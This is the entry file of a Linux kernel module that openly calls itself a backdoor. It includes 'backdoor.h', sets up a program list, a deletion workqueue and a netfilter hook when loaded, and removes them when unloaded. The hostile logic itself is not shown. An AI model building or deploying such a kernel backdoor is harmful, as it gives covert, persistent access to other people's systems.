#include "backdoor.h"

static int __init init_mod(void){
	init_prog_list();
	init_del_workqueue();
	return nfhook_init();
}

static void __exit exit_mod(void){
	exit_del_workqueue();
	nfhook_exit();
}

module_init(init_mod);
module_exit(exit_mod);
